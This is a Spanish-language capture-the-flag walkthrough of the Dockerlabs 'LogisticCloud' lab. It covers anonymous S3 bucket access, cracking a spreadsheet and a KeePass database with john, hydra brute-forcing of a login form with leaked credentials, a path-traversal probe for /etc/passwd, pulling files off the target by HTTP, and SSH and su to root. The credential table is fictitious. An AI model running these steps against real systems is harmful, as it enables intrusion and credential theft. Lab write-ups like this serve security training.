
# Writeup Template: Maquina `[ LogisticCloud ]`

- Tags: #LogisticCloud #AWS
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina LogisticCloud](https://mega.nz/file/3FcyGZra#T4gJ35FYNaGy19uKDpIqzvuB7KXjRgI-d6CY5UYsSUI) Laboratorio para practicar hacking en la nube con un entorno de AWS simulado.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x logisticcloud.zip
sudo bash auto_deploy.sh logisticcloud.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,9000,9001 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58 ((UbuntuNoble))
9000/tcp open  http    Golang net/http server
9001/tcp open  http    Golang net/http server
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:Tenemos un panel de inicio de sesion que no tenemos las credenciales.
```bash
http://172.17.0.2/index.php
```

Revisando el codigo fuente tenemos es fragmenteo de codigo **HTML**:
```bash
<input hidden="huguelogistics-data" name="bucket">
```

### 1. **Que es este elemento:**
- Es un campo de entrada oculto (`<input hidden>`) en un formulario HTML.
- **Propósito:** Almacenar datos que se envían al servidor cuando un usuario envía un formulario, pero **sin mostrarse visualmente** en la página.
- **`name="bucket"`:** Indica que el dato asociado se identificará como `bucket` al llegar al servidor.
- **`hidden="huguelogistics-data"`:** Es un atributo personalizado (no estándar). Posiblemente usado para almacenar información interna.

### 2. **Como se relaciona con servicios en la nube:**
El término **`bucket`** es clave aquí:
- **En la nube**, un **"bucket"** es un **contenedor de almacenamiento** en servicios como:
    - **Amazon S3** (AWS).
    - **Google Cloud Storage**.
    - **Azure Blob Storage**.
##### 1. `aws`
El comando base de la **AWS CLI** (Interfaz de Línea de Comandos de Amazon Web Services). Es la herramienta principal para interactuar con servicios de AWS desde la terminal.
##### 2. `--no-sign-request`
**Propósito:** Desactiva la firma de solicitudes AWS (autenticación).  
##### 3. `--endpoint-url http://172.17.0.2:9000`
**Propósito:** Especifica un endpoint personalizado (no el oficial de AWS).
##### 4. `s3api`
**Propósito:** Grupo de comandos para interactuar con la **API de bajo nivel de S3** (a diferencia de `s3`, que es de alto nivel).
##### 5. `get-bucket-policy`
**Propósito:** Subcomando específico para **obtener la política de seguridad de un bucket de S3**.
##### 6. `--bucket huguelogistics-data`
**Propósito:** Especifica el nombre del bucket objetivo.
```bash
aws --no-sign-request --endpoint-url http://172.17.0.2:9000 s3api get-bucket-policy --bucket huguelogistics-data | jq -r '.Policy | fromjson | .Statement[] | {Effect, Principal, Action, Resource, Sid}'
```

Resultado:
```js
{
  "Effect": "Allow",
  "Principal": {
    "AWS": [
      "*"
    ]
  },
  "Action": [
    "s3:GetBucketPolicy",
    "s3:GetObject",
    "s3:ListBucket"
  ],
  "Resource": [
    "arn:aws:s3:::huguelogistics-data",
    "arn:aws:s3:::huguelogistics-data/*"
  ],
  "Sid": "AllowPublicReadPolicy"
}
```

1. **Política pública de lectura**:
    - Esta política permite acceso **público y anónimo** al bucket
    - Cualquier persona (`"Principal": {"AWS": ["*"]}`) puede acceder sin autenticación
        
2. **Permisos otorgados**:
    - 🔍 `s3:ListBucket`: Ver la lista de archivos en el bucket
    - 📥 `s3:GetObject`: Descargar/leer los archivos del bucket
    - 📜 `s3:GetBucketPolicy`: Leer esta misma política
        
3. **Alcance**:
    - Aplica al bucket completo (`arn:aws:s3:::huguelogistics-data`)        
    - Y a todos sus archivos (`arn:aws:s3:::huguelogistics-data/*`)
        
### ¿Que significa en practica?
- ✅ Cualquiera puede listar los archivos del bucket
- ✅ Cualquiera puede descargar los archivos del bucket
- ✅ Cualquiera puede ver esta política de acceso
- ❌ **No permite** subir, modificar o borrar archivos

### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/
http://172.17.0.2/ [200 OK] Apache[2.4.58], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Title[Login - HLG Logistics]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/vendor/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/vendor/              (Status: 200) [Size: 3104]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,txt,backup,sh,html,js,java,pl
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 1953]
/admin.php            (Status: 302) [Size: 0] [--> index.php]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/vendor               (Status: 301) [Size: 309] [--> http://172.17.0.2/vendor/]
/note.txt             (Status: 200) [Size: 13]
```

### Descubrimiento de Subdominios
```bash
ffuf -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://172.17.0.2/vendor/autoload.php?FUZZ=../../../../etc/passwd" -fs 0
```

- **Hallazgos**:
	No reporta nada

Tenemos esta url con un archivo note.**txt**:
```bash
http://172.17.0.2/note.txt
```

Revisando su contenido:
```bash
/backup.xlsx
```

**Descarga el archivo `backup.xlsx` desde el bucket de almacenamiento a tu computadora local.**
1. `aws`
    - Herramienta de línea de comandos de AWS
        
2. `--no-sign-request`
    - **Acceso sin credenciales** (usa permisos públicos del bucket)
        
3. `--endpoint-url http://172.17.0.2:9000`
    - **Servidor local** (no es AWS real, probablemente MinIO en Docker)
    - Dirección: `172.17.0.2` 
    - Puerto: `9000`
        
4. `s3 cp`
    - **Comando de copia** para S3
        
5. `s3://huguelogistics-data/backup.xlsx`
    - **Origen**: Archivo Excel en el bucket `huguelogistics-data`
        
6. `.`
    - **Destino**: Directorio actual donde ejecutas el comando
```bash
aws --no-sign-request --endpoint-url http://172.17.0.2:9000 s3 cp s3://huguelogistics-data/backup.xlsx .
```

Archivo descargado:
```bash
download: s3://huguelogistics-data/backup.xlsx to ./backup.xlsx
```

Por lo que vemos es un archivo de **xlsx** parecido a **excel** pero como lo tenemos **libreoffice** lo tendremos que instalar de la siguiente manera:
```bash
sudo apt update
sudo apt install libreoffice -y
```

Una ves instalado intentamos abrir el archivo pero nos pide contrasena:
Asi que usaremos **john** para crakearlo
```bash
office2john backup.xlsx > hash.xlsx
```

Ahora ejeuctamos lo siguiente para crakearlo
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.xlsx
```

Ahora tenemos la credencial para lograr ver el contenido:
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
password88       (backup.xlsx) 
```

### Credenciales Encontradas:
```xlsx
|ID|Nombre Completo|Correo|Departamento|Rol|Usuario|Contraseña|Teléfono|Ciudad|Fecha de Ingreso|
|1|Juan Antonio Morell Aller|wilfredo66@example.org|Almacén|Operador|juan.antonio.morell.aller|^6hcCUvV#J|+34987 322 009|Guipúzcoa|2024-04-05|
|2|Ligia Molina Luna|candelasvendrell@example.net|Transporte|Supervisor|ligia.molina.luna|_8Gq&BU+3h|+34974 020 715|Guipúzcoa|2021-12-19|
|3|Humberto Madrid Bellido|carrenorosalva@example.com|Logística|Auxiliar|humberto.madrid.bellido|9)6v_2HpbW|+34 988 88 61 68|Valencia|2023-05-22|
|4|Jimena Mora Aguilera|zacariascoca@example.net|Transporte|Administrativo|jimena.mora.aguilera|#4M#NiaqQU|+34803 232 379|Zaragoza|2025-01-10|
|5|Sandra del Tudela|qiniguez@example.net|Compras|Jefe de Área|sandra.del.tudela|6hSM5CM&E@|+34884 69 32 88|Segovia|2023-08-30|
|6|Amador Vilanova Mármol|jose-ignacio71@example.org|Transporte|Administrativo|amador.vilanova.mármol|rtPQC(Nq!7|+34872 191 824|Ciudad|2022-03-03|
|7|Bautista Egea Pujol|lacero@example.com|Compras|Supervisor|bautista.egea.pujol|^)FJ!5Cm5R|+34 948026974|Málaga|2020-09-01|
|8|Jeremías Macias Mas|eulaliaalmansa@example.org|Almacén|Supervisor|jeremías.macias.mas|*7@6Zt@)!9|+34800 443 911|Barcelona|2023-09-06|
|9|Adoración Puente Gordillo|sergiocaceres@example.org|Inventario|Supervisor|adoración.puente.gordillo|lAPEiLX*@1|+34871 942 371|Sevilla|2022-05-14|
|10|Galo Frías Ledesma|fito11@example.net|Almacén|Administrativo|galo.frías.ledesma|SGJu2Dksq$|+34 945 35 01 30|Málaga|2023-08-16|
|11|Benigno Corbacho Carrasco|psamper@example.com|Almacén|Operador|benigno.corbacho.carrasco|n3Rr^yQQ&G|+34 922 63 68 37|Jaén|2025-04-18|
|12|Prudencia de Ferrera|dmartorell@example.org|Logística|Jefe de Área|prudencia.de.ferrera|)4UJM)JGab|+34882284790|Girona|2024-07-26|
|13|Severiano Mayoral-Batalla|isaac68@example.net|Logística|Administrativo|severiano.mayoral-batalla|Q$Gr2QipQr|+34 921 80 98 92|Zaragoza|2024-09-11|
|14|Esteban Polo Díez|hernando06@example.com|Inventario|Jefe de Área|esteban.polo.díez|54PDgg0C!B|+34871 138 884|Jaén|2023-10-22|
|15|Mayte Tomasa Gomis Merino|oacevedo@example.net|Transporte|Supervisor|mayte.tomasa.gomis.merino|bU8Dkln5(c|+34872 106 506|Valencia|2023-11-02|
|16|Custodio del Llobet|teodosio65@example.net|Logística|Administrativo|custodio.del.llobet|GW)8zqMq7V|+34 849 763 327|Santa Cruz de Tenerife|2021-03-08|
|17|Adán Río Alcántara|solisazucena@example.com|Transporte|Jefe de Área|adán.río.alcántara|Xuw*%6LxyY|+34 984 51 39 76|Girona|2025-04-24|
|18|Nazaret Suarez Armengol|artigasangela@example.net|Inventario|Administrativo|nazaret.suarez.armengol|3axg@VTc#u|+34 923 857 056|Segovia|2020-10-09|
|19|Angelina Cardona Miguel|ruben88@example.org|Mantenimiento|Jefe de Área|angelina.cardona.miguel|*@9CUg7x%J|+34878 16 69 73|Asturias|2022-10-05|
|20|Febe Pina Cuervo|ksanchez@example.net|Almacén|Operador|febe.pina.cuervo|(8^o1QyK$$|+34 806 843 601|La Coruña|2022-11-02|
|21|Lourdes Ribera Alberdi|feijooroman@example.org|Inventario|Auxiliar|lourdes.ribera.alberdi|&@D#*yK9@7|+34924569711|Granada|2022-03-27|
|22|Ester Montaña-Torre|manu58@example.org|Compras|Jefe de Área|ester.montaña-torre|2s(WnDOf@1|+34928 204 869|Santa Cruz de Tenerife|2024-06-17|
|23|Federico Cabanillas|jeronimo15@example.net|Logística|Auxiliar|federico.cabanillas|2Sa19CRh!Q|+34724934839|La Rioja|2021-10-06|
|24|Valentín Solano-Rosa|dominga83@example.org|Almacén|Jefe de Área|valentín.solano-rosa|(99(qUhDrM|+34878 844 688|Pontevedra|2024-05-04|
|25|Jose Ignacio Reinaldo Teruel Porta|oguardia@example.org|Transporte|Operador|jose.ignacio.reinaldo.teruel.porta|sxLoQJEt#4|+34 700 66 25 06|Cantabria|2024-10-12|
|26|Tiburcio Paz Verdugo|dpou@example.net|Compras|Jefe de Área|tiburcio.paz.verdugo|%^_5TQf+gz|+34822863629|León|2021-12-27|
|27|Clemente Ramirez Mateu|pascualacapdevila@example.org|Transporte|Administrativo|clemente.ramirez.mateu|_+8AZao@qn|+34 928 031 784|Ciudad|2021-02-20|
|28|Palmira de Villalobos|jose-antonio45@example.org|Logística|Administrativo|palmira.de.villalobos|_2gYpvOwG2|+34 882 90 74 40|Ceuta|2022-04-23|
|29|Marita Salvador Ferrández|barrancomaria-dolores@example.org|Logística|Auxiliar|marita.salvador.ferrández|S8l7RwQc!t|+34 973 225 185|Alicante|2020-12-29|
|30|Inmaculada de Arnal|jose-manuel26@example.net|Logística|Auxiliar|inmaculada.de.arnal|MnW(9E8k3j|+34 844273522|Cantabria|2025-04-27|
|31|Ezequiel Landa Duque|renatamontana@example.org|Compras|Supervisor|ezequiel.landa.duque|5Z6QCDBpy+|+34 824 29 31 08|Huelva|2021-07-09|
|32|Domingo Llanos|lucia21@example.org|Inventario|Supervisor|domingo.llanos|XAPz4#8jb$|+34826 31 95 93|Zamora|2024-11-09|
|33|Antonia Morell Fabra|tomas46@example.com|Transporte|Jefe de Área|antonia.morell.fabra|&mP$8Uj#*7|+34987571470|Toledo|2022-07-31|
|34|Cristian Puga Fabra|ncobos@example.com|Almacén|Administrativo|cristian.puga.fabra|53Yq6Ghn#&|+34 849 70 56 05|Ourense|2022-01-19|
|35|Curro Chamorro Gilabert|imelda34@example.net|Logística|Supervisor|curro.chamorro.gilabert|B9*UPNfW$y|+34 941355306|Pontevedra|2022-08-09|
|36|Encarnación Herrera Blázquez|cabezasiban@example.org|Inventario|Administrativo|encarnación.herrera.blázquez|2q02WvoiT@|+34 748 263 077|Castellón|2021-02-12|
|37|Cayetano Linares Villalobos|banospedro@example.org|Logística|Auxiliar|cayetano.linares.villalobos|&_jRdCg03H|+34 875736508|Cáceres|2021-08-22|
|38|Antonia Fuertes|mario61@example.org|Mantenimiento|Operador|antonia.fuertes|_OyNjz(c*7|+34 901 542 132|Toledo|2022-01-09|
|39|Miguel Nieto|fabianmontes@example.org|Almacén|Jefe de Área|miguel.nieto|RiO3Wckw$1|+34 884890314|Almería|2021-09-12|
|40|Ainoa Antón Pérez|ciro86@example.net|Logística|Auxiliar|ainoa.antón.pérez|(&2$WvqJh!|+34987 90 80 18|Valladolid|2021-11-03|
|41|León Mora Guzmán|broma@example.com|Mantenimiento|Supervisor|león.mora.guzmán|)FmIJfth2T|+34846 505 074|Castellón|2020-09-10|
|42|Leonardo Feliu Navarro|juan-luiscarbonell@example.net|Transporte|Supervisor|leonardo.feliu.navarro|%mBN52xke8|+34883610616|Madrid|2023-05-29|
|43|Onofre Riba Catalán|cortestania@example.net|Inventario|Operador|onofre.riba.catalán|uL(2ANGr*^|+34 846 683 910|Pontevedra|2021-11-06|
|44|Asunción Modesta Sandoval Pou|iclemente@example.org|Transporte|Administrativo|asunción.modesta.sandoval.pou|Ff8eBEzsV+|+34 901 475 715|Salamanca|2024-10-27|
|45|Juanita Raya Ferrero|primitivapalma@example.net|Almacén|Auxiliar|juanita.raya.ferrero|(+F1#sHnTm|+34 803219321|Las Palmas|2024-08-09|
|46|Olga Llorens Campillo|calixtapalau@example.org|Compras|Auxiliar|olga.llorens.campillo|89#gG2%z$7|+34821 62 72 97|Alicante|2024-04-23|
|47|Amarilis Pelayo Leiva|pepitonogues@example.com|Mantenimiento|Jefe de Área|amarilis.pelayo.leiva|$76Jl6talZ|+34 734 120 043|Palencia|2023-12-15|
|48|Mónica de Alfaro|pbastida@example.org|Transporte|Jefe de Área|mónica.de.alfaro|g3ZSZ3Ay^I|+34 944 01 14 65|Lleida|2022-10-09|
|49|Albina Santamaría Crespo|bolanosfito@example.org|Inventario|Supervisor|albina.santamaría.crespo|+1AzD)3rqk|+34 914674480|Girona|2024-10-27|
|50|Jacinta Domingo-Olivera|camilosolera@example.net|Inventario|Auxiliar|jacinta.domingo-olivera|n@7CGluvBK|+34949473198|Guadalajara|2025-01-20|
```

Ahora usaremos estas credenciales para intentar loguearnos en el panel de administracion: tanto los nombres de usuarios y las contrasenas las almacenamos en archivos:
```bash
 passwords.txt   users.txt
```

Antes de realizar el ataque de fuerza bruta, a nuestro archivo **users.txt** como contiene los nombres separados necesitamos unirlos para prueba el nombre completo:
Estando dentro del editor: En mi caso **NeoVim** aplicaremos la siguiente **regex** para unir los nombres por **.**
```bash
:%s/ /./g
```

Ahora lanzamos el diccionario:
```bash
hydra -L users.txt -P passwords.txt 172.17.0.2 http-post-form "/index.php:username=^USER^&password=^PASS^:Credenciales incorrectas." -V -f 
```

Tenemos credenciales validas:
```bash
Username: prudencia.de.ferrera - Password: )4UJM)JGab
```

Logramos ganar acceso al panel administrativo

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Aqui tenemos informacion valiosa que nos sirve para ganar acceso por **ssh**

##### Bandeja Entrada:
```bash
### Mensaje del Administrador

**Usuario:** prudencia.de.ferrera

**Credenciales SSH:**

            Usuario: prudencia-de-ferrera
            Contraseña: PuT3r3stA#SH
            Host: 192.168.1.100
            Puerto: 22
            

Por favor, conéctate al servidor y revisa el estado del sistema de logística para resolver cualquier incidencia.
```
### Intrusion
Ahora nos aprovechamos de esto para ganar acceso por **ssh**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh prudencia-de-ferrera@172.17.0.2 # ( PuT3r3stA#SH )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Buscaremos por archivos del usuario **root**
```bash
# Comandos clave ejecutados
find /etc -type f -user root -exec stat --format '%Y :%y %n' {} + 2>/dev/null | sort -nr | head
```

Resultado:
```bash
1750617040 :2025-06-22 20:30:40.362640957 +0200 /etc/resolv.conf
1750617040 :2025-06-22 20:30:40.362640957 +0200 /etc/hosts
1750617040 :2025-06-22 20:30:40.170653412 +0200 /etc/hostname
1746718769 :2025-05-08 17:39:29.000000000 +0200 /etc/keepass/credentialsDatabase.kdb
```

### Explotacion de Privilegios

###### Usuario `[ prudencia-de-ferrera ]`:
Tenemos un archivo que es una **bd** con credencilaes
```bash
1746718769 :2025-05-08 17:39:29.000000000 +0200 /etc/keepass/credentialsDatabase.kdb
```

Ahora nos movemos a esta ruta:
```bash
cd /etc/keepass/
```

Sabiendo que existe el binario de python en el sistema:
```bash
which python3
/usr/bin/python3
```

Nos montamos un servidor python para dejar accesible este archivo: **credentialsDatabase.kdb** desde la maquina victima
```bash
python3 -m http.server 8080
```

Ahora desde nuestra maquina atacante nos descargamos el archivo:
```bash
wget http://172.17.0.2:8080/credentialsDatabase.kdb
```

Ahora lo creakearemos con **john** de la siguiente manera: Convertimos a **hash**
```bash
keepass2john credentialsDatabase.kdb > hash.txt
```

Ahora realizamos ataque de fuerza bruta:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Tenemos la credencial:
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
EMINEM           (credentialsDatabase.kdb)
```

Ahora procedmeos a abrir el archivo con **keypass** desde un sistema **windows** 
ingresamos la clave maestra: **EMINE** para despues obtener las siguientes credencilaes:
```bash
Credenciales Pablo: RMeEdDPKbgFWmPnQHVC8
```

Ahora probamos esta contrasena como usuario **root**
```bash
# Comando para escalar al usuario: ( root )
su root # ( RMeEdDPKbgFWmPnQHVC8 )
```

---

## Evidencia de Compromiso
Flags **root**
```bash
root@26f0e918c5d7:/etc/keepass# cat /root/root.txt 
16ceffb6b5f596855037e8ab1718b75f
```

```bash
# Captura de pantalla o output final
root@26f0e918c5d7:/etc/keepass# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos de servicios en la nube
2. Aprendimos a enumerar servicios en la nube para obtenr informacion valisoa